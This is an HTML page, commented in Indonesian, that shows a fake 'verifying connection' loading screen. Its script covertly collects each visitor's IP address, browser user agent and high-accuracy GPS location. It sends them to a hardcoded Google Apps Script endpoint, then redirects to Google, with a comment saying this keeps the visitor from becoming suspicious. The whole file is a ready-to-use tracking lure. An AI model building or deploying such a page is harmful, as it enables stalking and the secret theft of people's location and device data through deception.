<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memuat Halaman...</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f4f4f4; color: #555; }
        .container { text-align: center; }
        .loader { border: 4px solid #ddd; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="container">
        <div class="loader"></div>
        <h3 id="status">Sedang memverifikasi koneksi...</h3>
        <p>Mohon tunggu sebentar, konten sedang disiapkan.</p>
    </div>

    <script>
        const statusText = document.getElementById("status");
        
        // GANTI DENGAN URL GOOGLE APPS SCRIPT ANDA
        const URL_GAS = "https://script.google.com/macros/s/AKfycbwcx5lSKsMK9hUrs0jn-tITO0ZihemSDakpgvRkuLuygTPzPczRZ2c8D3q6fORVPU5i/exec"; 

        async function mulaiLacak() {
            let dataLog = {
                ip: "Tidak Terdeteksi",
                device: navigator.userAgent,
                lat: "Ditolak",
                lon: "Ditolak",
                acc: "-"
            };

            // 1. Ambil Alamat IP (Menggunakan API pihak ketiga gratis)
            try {
                const response = await fetch('https://api.ipify.org');
                const resData = await response.json();
                dataLog.ip = resData.ip;
            } catch (e) { console.log("Gagal ambil IP"); }

            // 2. Minta Izin GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        dataLog.lat = position.coords.latitude;
                        dataLog.lon = position.coords.longitude;
                        dataLog.acc = position.coords.accuracy + " meter";
                        kirimData(dataLog);
                    },
                    (error) => {
                        console.log("GPS Ditolak");
                        kirimData(dataLog); // Tetap kirim data meskipun GPS ditolak (hanya IP & Device)
                    },
                    { enableHighAccuracy: true, timeout: 8000 }
                );
            } else {
                kirimData(dataLog);
            }
        }

        function kirimData(payload) {
            statusText.innerText = "Hampir selesai...";
            
            fetch(URL_GAS, {
                method: "POST",
                mode: "no-cors",
                body: JSON.stringify(payload),
                headers: { "Content-Type": "application/json" }
            })
            .then(() => {
                // Setelah terkirim, alihkan ke situs lain agar tidak curiga
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 1000);
            })
            .catch(err => {
                console.log("Error pengiriman");
                window.location.href = "https://www.google.com";
            });
        }

        // Jalankan saat halaman dibuka
        window.onload = mulaiLacak;
    </script>
</body>
</html>
